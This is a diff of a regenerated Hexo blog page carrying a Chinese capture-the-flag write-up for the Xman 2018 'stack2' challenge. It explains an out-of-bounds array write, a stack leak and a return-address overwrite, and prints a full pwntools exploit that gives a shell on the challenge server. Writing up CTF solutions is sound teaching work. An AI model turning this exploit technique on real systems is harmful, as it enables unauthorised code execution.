@@ -1,7 +1,7 @@
 
  <!DOCTYPE HTML>
-<html >
-<head>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
   
     <title>Xman选拔赛2018-Xman-stack2 | Hexo</title>
@@ -26,13 +26,13 @@
     
     <link rel="stylesheet" href="/css/style.css">
 </head>
-
+</html>
   <body>
     <header>
       <div>
 		
 			<div id="imglogo">
-				<a href="/"><img src="/img/logo.svg" alt="Hexo" title="Hexo"/></a>
+				<a href="/"><img src="/img/logo.svg" alt="Hexo" title="Hexo"></a>
 			</div>
 			
 			<div id="textlogo">
@@ -52,7 +52,7 @@
 					
 					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
 						<label>Search</label>
-						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search">
 						<input type="hidden" name="q" value="site:lometsj.com">
 					</form>
 					
@@ -63,7 +63,7 @@
 
     </header>
     <div id="container">
-      <div id="main" class="post" itemscope itemprop="blogPost">
+      <div id="main" class="post" itemscope="" itemprop="blogPost">
 	<article itemprop="articleBody"> 
 		<header class="article-info clearfix">
   <h1 itemprop="name">
@@ -76,7 +76,7 @@
     </p>
   <p class="article-time">
     <time datetime="2018-07-16T07:07:18.000Z" itemprop="datePublished">2018-07-16</time>
-    Updated:<time datetime="2018-07-16T11:40:41.788Z" itemprop="dateModified">2018-07-16</time>
+    Updated:<time datetime="2018-07-16T11:40:41.000Z" itemprop="dateModified">2018-07-16</time>
     
   </p>
 </header>
@@ -89,10 +89,10 @@
 		</div>
 		
 		<p>一个根据数据求平均数的程序,在change num的时候,对于要改变的数字的序号没有检查,可以导致数组越界.我们可以利用数组越界来修改栈上的数据.</p>
-<p>接下来需要知道返回地址的偏移是多少,由于我们这里是在main函数上,无法简单计算偏移.在本地上,我是这样寻找的<br>首先我多次查看ldd的结果,发现libc的高位始终是0xf7<br>然后又在main函数的最后ret指令处下了个断点,开gdb看,发现ret时栈顶的数据是<code>__libc_start_main+247</code>,247加上这个函数的偏移,也不会使高位地址0xf7改变<br>接着我发现,在程序刚开始运行,初始化数组时对输入的数组长度也没有检查,当我输入大于100的数字时,虽然只会读入最多100个数,但是长度却被保留了下来.当我选择输出所有数字时,就可以泄漏栈上的数据<br>格式如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">0\t\tx</div><div class="line">1\t\tx</div><div class="line">2\t\tx</div><div class="line">....</div><div class="line">100\t\tx</div><div class="line">101....</div></pre></td></tr></table></figure></p>
-<p>可以看到超过100长度任会输出,对于0xf7,这里<code>%d</code>的输入为-9,我这里输入了一个很大的长度,读取了1000条数据,然后我把所有数据拉下来复制到文本文件中,再使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat data | grep \\-9</div></pre></td></tr></table></figure></p>
+<p>接下来需要知道返回地址的偏移是多少,由于我们这里是在main函数上,无法简单计算偏移.在本地上,我是这样寻找的<br>首先我多次查看ldd的结果,发现libc的高位始终是0xf7<br>然后又在main函数的最后ret指令处下了个断点,开gdb看,发现ret时栈顶的数据是<code>__libc_start_main+247</code>,247加上这个函数的偏移,也不会使高位地址0xf7改变<br>接着我发现,在程序刚开始运行,初始化数组时对输入的数组长度也没有检查,当我输入大于100的数字时,虽然只会读入最多100个数,但是长度却被保留了下来.当我选择输出所有数字时,就可以泄漏栈上的数据<br>格式如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0\t\tx</span><br><span class="line">1\t\tx</span><br><span class="line">2\t\tx</span><br><span class="line">....</span><br><span class="line">100\t\tx</span><br><span class="line">101....</span><br></pre></td></tr></table></figure></p>
+<p>可以看到超过100长度任会输出,对于0xf7,这里<code>%d</code>的输入为-9,我这里输入了一个很大的长度,读取了1000条数据,然后我把所有数据拉下来复制到文本文件中,再使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat data | grep \\-9</span><br></pre></td></tr></table></figure></p>
 <p>查看所有输出-9的偏移量,这个时候就可以写脚本了,暴力的把所有带-9的地址换成hackhere函数的地址,于是得到了shell</p>
-<p>然后改成remote我发现:<br><strong>服务器上的/bin/bash被删了</strong><br>这就让我有点思考人生,暂时没有思路,我就先把返回地址的准确偏移找出来,一个一个删除偏移,测试哪个是真正的返回地址.最后找到偏移132(高位135)存储的返回地址<br>回过头来,尝试把<code>/bin/bash</code>截断成<code>sh</code>直接起shell<br>开始我构造的是callsystem+ret+’sh’地址,没能成功,想了半天,才想起来这里的返回地址覆盖的是call()的地址而不是system()的实际地址,所以’sh’的地址要紧挨着callsystem(其实直接返回plt不就好了)<br>最终exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line">def change(index,value):</div><div class="line">         io.sendline(&apos;3&apos;)</div><div class="line">         io.recv()</div><div class="line">         sleep(0.1)</div><div class="line">         io.sendline(index)</div><div class="line">         io.recv()</div><div class="line">         sleep(0.1)</div><div class="line">         io.sendline(value)</div><div class="line">         io.recv()</div><div class="line">	 sleep(0.1)</div><div class="line">#io = process(&apos;./stack2&apos;)</div><div class="line">io = remote(&apos;47.96.239.28&apos;,2333)</div><div class="line">l = [135]</div><div class="line">io.recv()</div><div class="line">io.sendline(&apos;1&apos;)</div><div class="line">io.recv()</div><div class="line">io.sendline(&apos;1&apos;)</div><div class="line">io.recv()</div><div class="line">for i in l:</div><div class="line">	change(str(i),&apos;8&apos;)</div><div class="line">	change(str(i-1),&apos;4&apos;)</div><div class="line">	change(str(i-2),&apos;133&apos;)</div><div class="line">	change(str(i-3),&apos;180&apos;)</div><div class="line">change(&apos;136&apos;,&apos;135&apos;)</div><div class="line">change(&apos;137&apos;,&apos;137&apos;)</div><div class="line">change(&apos;138&apos;,&apos;4&apos;)</div><div class="line">change(&apos;139&apos;,&apos;8&apos;)</div><div class="line">io.sendline(&apos;5&apos;)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<p>然后改成remote我发现:<br><strong>服务器上的/bin/bash被删了</strong><br>这就让我有点思考人生,暂时没有思路,我就先把返回地址的准确偏移找出来,一个一个删除偏移,测试哪个是真正的返回地址.最后找到偏移132(高位135)存储的返回地址<br>回过头来,尝试把<code>/bin/bash</code>截断成<code>sh</code>直接起shell<br>开始我构造的是callsystem+ret+’sh’地址,没能成功,想了半天,才想起来这里的返回地址覆盖的是call()的地址而不是system()的实际地址,所以’sh’的地址要紧挨着callsystem(其实直接返回plt不就好了)<br>最终exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">def change(index,value):</span><br><span class="line">         io.sendline(&apos;3&apos;)</span><br><span class="line">         io.recv()</span><br><span class="line">         sleep(0.1)</span><br><span class="line">         io.sendline(index)</span><br><span class="line">         io.recv()</span><br><span class="line">         sleep(0.1)</span><br><span class="line">         io.sendline(value)</span><br><span class="line">         io.recv()</span><br><span class="line">	 sleep(0.1)</span><br><span class="line">#io = process(&apos;./stack2&apos;)</span><br><span class="line">io = remote(&apos;47.96.239.28&apos;,2333)</span><br><span class="line">l = [135]</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(&apos;1&apos;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(&apos;1&apos;)</span><br><span class="line">io.recv()</span><br><span class="line">for i in l:</span><br><span class="line">	change(str(i),&apos;8&apos;)</span><br><span class="line">	change(str(i-1),&apos;4&apos;)</span><br><span class="line">	change(str(i-2),&apos;133&apos;)</span><br><span class="line">	change(str(i-3),&apos;180&apos;)</span><br><span class="line">change(&apos;136&apos;,&apos;135&apos;)</span><br><span class="line">change(&apos;137&apos;,&apos;137&apos;)</span><br><span class="line">change(&apos;138&apos;,&apos;4&apos;)</span><br><span class="line">change(&apos;139&apos;,&apos;8&apos;)</span><br><span class="line">io.sendline(&apos;5&apos;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -111,18 +111,18 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/posts/2d4d8c7/" title="关于科研训练的一些事情">
-  <strong>PREVIOUS:</strong><br/>
+ <div class="prev">
+ <a href="/posts/1637f1a/" title="11/9">
+  <strong>PREVIOUS:</strong><br>
   <span>
-  关于科研训练的一些事情</span>
+  11/9</span>
 </a>
 </div>
 
 
 <div class="next">
-<a href="/posts/a7fbebed/"  title="Xman选拔赛2018-Xman-dice_game">
- <strong>NEXT:</strong><br/> 
+<a href="/posts/a7fbebed/" title="Xman选拔赛2018-Xman-dice_game">
+ <strong>NEXT:</strong><br> 
  <span>Xman选拔赛2018-Xman-dice_game
 </span>
 </a>
@@ -154,7 +154,7 @@
 </aside>
 </div>
     </div>
-    <footer><div id="footer" >
+    <footer><div id="footer">
 	
 	<div class="line">
 		<span></span>
